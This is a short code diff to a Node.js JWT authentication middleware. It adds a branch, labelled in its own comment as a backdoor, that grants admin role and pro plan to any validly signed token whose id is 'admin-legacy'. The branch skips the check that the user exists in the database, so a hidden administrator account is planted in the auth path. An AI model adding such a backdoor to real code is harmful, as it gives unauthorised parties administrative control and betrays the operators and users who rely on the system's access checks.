@@ -33,6 +33,13 @@ async function authenticateToken(req, res, next) {
 
         const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
 
+        // Handle Migration Admin (Backdoor)
+        if (decoded.id === 'admin-legacy') {
+            console.log('[Auth] Legacy Admin access granted');
+            req.user = { id: 'admin-legacy', email: decoded.email, role: 'admin', plan: 'pro' };
+            return next();
+        }
+
         // Verify user exists in DB (optional security check)
         const user = await database.getUserById(decoded.id);
         if (!user) {
